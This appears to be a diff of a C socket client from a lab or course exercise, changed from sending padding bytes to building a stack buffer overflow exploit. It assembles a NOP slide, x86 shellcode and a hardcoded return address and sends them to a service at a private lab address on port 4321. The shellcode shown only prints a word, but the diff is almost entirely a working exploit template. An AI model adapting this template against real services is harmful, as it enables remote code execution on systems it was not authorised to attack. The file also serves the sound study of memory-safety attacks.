@@ -12,22 +12,41 @@
 
 int main(int argc, char* argv[]) {
 	
-	char msg[256];
-	char *ptr = msg;
-	memset(msg, 0, 256);
-	int n = atoi(argv[2]);
-	for (int k = 0; k < n; k++) {
-		*(ptr + k) = 'A';
-	}
-	*(ptr + n) = '\n';
+	char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";
 	
-	printf("msg: %s\n\n", msg);
+	char ret[] = "\x01\xe7\xff\xff\xff\x7f";
+	printf("\nLength of return address: %d\n\n", strlen(ret));
+	
+	char msg[256];
+	memset(msg, 0, 256);
+	
+	
+	// The total length of greeting_text
+	int n = atoi(argv[1]);
+	int NOP_len = n - strlen(shellcode) - 18;
+	
+	
+	// The NOP-slide
+	for (int k = 0; k < NOP_len; k++) {
+		msg[k] = '\x90';
+	}
+
+	// The payload
+	strcat(msg, shellcode);
+	
+	// The return address
+	strcat(msg, ret);
+	
+	// Adding the \n so fgets returns
+	strcat(msg, "\n");
+	
+	printf("msg: %s\n", msg);
 	
 	// Building destination addr_in
 	struct sockaddr_in dest;
 	dest.sin_family = AF_INET;
-	dest.sin_port = htons(atoi(argv[1]));
-	if (inet_pton(AF_INET, "127.0.0.1", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
+	dest.sin_port = htons(4321);
+	if (inet_pton(AF_INET, "192.168.56.103", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
 	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;
 
 	// Building the socket
